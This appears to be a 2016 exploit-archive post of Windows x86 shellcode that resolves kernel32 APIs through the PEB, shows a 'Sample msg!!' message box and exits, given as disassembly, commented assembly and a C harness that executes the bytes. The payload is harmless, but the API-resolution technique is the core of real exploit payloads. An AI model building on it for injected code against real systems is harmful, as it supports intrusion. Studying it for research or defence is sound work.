/*
	# Title : Windows x86 MessageBoxA shellcode
	# Author : Roziul Hasan Khan Shifat
	# Date : 14-08-2016
	# Tested On : Windows 7 starter x86
*/


/*
Disassembly of section .text:

00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	64 8b 41 30          	mov    %fs:0x30(%ecx),%eax
   6:	8b 40 0c             	mov    0xc(%eax),%eax
   9:	8b 70 14             	mov    0x14(%eax),%esi
   c:	ad                   	lods   %ds:(%esi),%eax
   d:	96                   	xchg   %eax,%esi
   e:	ad                   	lods   %ds:(%esi),%eax
   f:	8b 48 10             	mov    0x10(%eax),%ecx
  12:	31 db                	xor    %ebx,%ebx
  14:	8b 59 3c             	mov    0x3c(%ecx),%ebx
  17:	01 cb                	add    %ecx,%ebx
  19:	8b 5b 78             	mov    0x78(%ebx),%ebx
  1c:	01 cb                	add    %ecx,%ebx
  1e:	8b 73 20             	mov    0x20(%ebx),%esi
  21:	01 ce                	add    %ecx,%esi
  23:	31 d2                	xor    %edx,%edx

00000025 <g>:
  25:	42                   	inc    %edx
  26:	ad                   	lods   %ds:(%esi),%eax
  27:	01 c8                	add    %ecx,%eax
  29:	81 38 47 65 74 50    	cmpl   $0x50746547,(%eax)
  2f:	75 f4                	jne    25 <g>
  31:	81 78 04 72 6f 63 41 	cmpl   $0x41636f72,0x4(%eax)
  38:	75 eb                	jne    25 <g>
  3a:	81 78 08 64 64 72 65 	cmpl   $0x65726464,0x8(%eax)
  41:	75 e2                	jne    25 <g>
  43:	8b 73 1c             	mov    0x1c(%ebx),%esi
  46:	01 ce                	add    %ecx,%esi
  48:	8b 14 96             	mov    (%esi,%edx,4),%edx
  4b:	01 ca                	add    %ecx,%edx
  4d:	89 d6                	mov    %edx,%esi
  4f:	89 cf                	mov    %ecx,%edi
  51:	31 db                	xor    %ebx,%ebx
  53:	53                   	push   %ebx
  54:	68 61 72 79 41       	push   $0x41797261
  59:	68 4c 69 62 72       	push   $0x7262694c
  5e:	68 4c 6f 61 64       	push   $0x64616f4c
  63:	54                   	push   %esp
  64:	51                   	push   %ecx
  65:	ff d2                	call   *%edx
  67:	83 c4 10             	add    $0x10,%esp
  6a:	31 c9                	xor    %ecx,%ecx
  6c:	68 6c 6c 42 42       	push   $0x42426c6c
  71:	88 4c 24 02          	mov    %cl,0x2(%esp)
  75:	68 33 32 2e 64       	push   $0x642e3233
  7a:	68 75 73 65 72       	push   $0x72657375
  7f:	54                   	push   %esp
  80:	ff d0                	call   *%eax
  82:	83 c4 0c             	add    $0xc,%esp
  85:	31 c9                	xor    %ecx,%ecx
  87:	68 6f 78 41 42       	push   $0x4241786f
  8c:	88 4c 24 03          	mov    %cl,0x3(%esp)
  90:	68 61 67 65 42       	push   $0x42656761
  95:	68 4d 65 73 73       	push   $0x7373654d
  9a:	54                   	push   %esp
  9b:	50                   	push   %eax
  9c:	ff d6                	call   *%esi
  9e:	83 c4 0c             	add    $0xc,%esp
  a1:	31 d2                	xor    %edx,%edx
  a3:	31 c9                	xor    %ecx,%ecx
  a5:	52                   	push   %edx
  a6:	68 73 67 21 21       	push   $0x21216773
  ab:	68 6c 65 20 6d       	push   $0x6d20656c
  b0:	68 53 61 6d 70       	push   $0x706d6153
  b5:	8d 14 24             	lea    (%esp),%edx
  b8:	51                   	push   %ecx
  b9:	68 68 65 72 65       	push   $0x65726568
  be:	68 68 69 20 54       	push   $0x54206968
  c3:	8d 0c 24             	lea    (%esp),%ecx
  c6:	31 db                	xor    %ebx,%ebx
  c8:	43                   	inc    %ebx
  c9:	53                   	push   %ebx
  ca:	52                   	push   %edx
  cb:	51                   	push   %ecx
  cc:	31 db                	xor    %ebx,%ebx
  ce:	53                   	push   %ebx
  cf:	ff d0                	call   *%eax
  d1:	31 c9                	xor    %ecx,%ecx
  d3:	68 65 73 73 41       	push   $0x41737365
  d8:	88 4c 24 03          	mov    %cl,0x3(%esp)
  dc:	68 50 72 6f 63       	push   $0x636f7250
  e1:	68 45 78 69 74       	push   $0x74697845
  e6:	8d 0c 24             	lea    (%esp),%ecx
  e9:	51                   	push   %ecx
  ea:	57                   	push   %edi
  eb:	ff d6                	call   *%esi
  ed:	31 c9                	xor    %ecx,%ecx
  ef:	51                   	push   %ecx
  f0:	ff d0                	call   *%eax
*/


/*
section .text
	global _start
_start:

xor ecx,ecx
mov eax,[fs:ecx+0x30] ;PEB
mov eax,[eax+0xc] ;PEB->Ldr
mov esi,[eax+0x14] ;PEB->ldr.InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov ecx,[eax+0x10] ;kernel32 base address


xor ebx,ebx
mov ebx,[ecx+0x3c] ;DOS->elf_anew
add ebx,ecx
mov ebx,[ebx+0x78] ;DataDirectory->VirtualAddress
add ebx,ecx ;IMAGE_EXPORT_DIRECTORY

mov esi,[ebx+0x20] ;AddressOfNames
add esi,ecx

;--------------------------------------------------


xor edx,edx
g:
inc edx
lodsd
add eax,ecx
cmp dword [eax],'GetP'
jnz g
cmp dword [eax+4],'rocA'
jnz g
cmp dword [eax+8],'ddre'
jnz g


;-----------------------------------------------------

mov esi,[ebx+0x1c] ;AddressOfFunctions
add esi,ecx
;---------------------------------


mov edx,[esi+edx*4]
add edx,ecx ;GetProcAddress()

;------------------
mov esi,edx
mov edi,ecx
;--------------------

;finding address of LoadLibraryA()
xor ebx,ebx
push ebx
push 0x41797261
push 0x7262694c
push 0x64616f4c


push esp
push ecx

call edx

add esp,16
;---------------------------
xor ecx,ecx

;LoadLibraryA("user32.dll")
push 0x42426c6c
mov [esp+2],byte cl
push 0x642e3233
push 0x72657375


push esp
call eax

;-------------------------

;Finding address of MessageBoxA()
add esp,12
xor ecx,ecx
push 0x4241786f
mov [esp+3],byte cl
push 0x42656761
push 0x7373654d

push esp
push eax

call esi

;---------------------------------
add esp,12

;----------------
;MessageBoxA(NULL,"Sample msg!!","hi There",1)

xor edx,edx
xor ecx,ecx


push edx
push 0x21216773
push 0x6d20656c
push 0x706d6153

lea edx,[esp] ; "Sample msg!!"

push ecx
push 0x65726568
push 0x54206968

lea ecx,[esp] ; "hi There"

xor ebx,ebx

inc ebx


push ebx
push edx
push ecx
xor ebx,ebx
push ebx

call eax


;----------------------
xor ecx,ecx
push 0x41737365
mov [esp+3],byte cl
push 0x636f7250
push 0x74697845


lea ecx,[esp]


push ecx
push edi

call esi

;---------------
xor ecx,ecx
push ecx
call eax
*/


#include<stdio.h>
#include<string.h>
char shellcode[]=\

"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x31\xdb\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xd6\x89\xcf\x31\xdb\x53\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x51\xff\xd2\x83\xc4\x10\x31\xc9\x68\x6c\x6c\x42\x42\x88\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x0c\x31\xc9\x68\x6f\x78\x41\x42\x88\x4c\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd6\x83\xc4\x0c\x31\xd2\x31\xc9\x52\x68\x73\x67\x21\x21\x68\x6c\x65\x20\x6d\x68\x53\x61\x6d\x70\x8d\x14\x24\x51\x68\x68\x65\x72\x65\x68\x68\x69\x20\x54\x8d\x0c\x24\x31\xdb\x43\x53\x52\x51\x31\xdb\x53\xff\xd0\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x0c\x24\x51\x57\xff\xd6\x31\xc9\x51\xff\xd0";

main()
{
printf("shellcode lenght %ld\n",(long)strlen(shellcode));
(* (int(*)()) shellcode) ();
}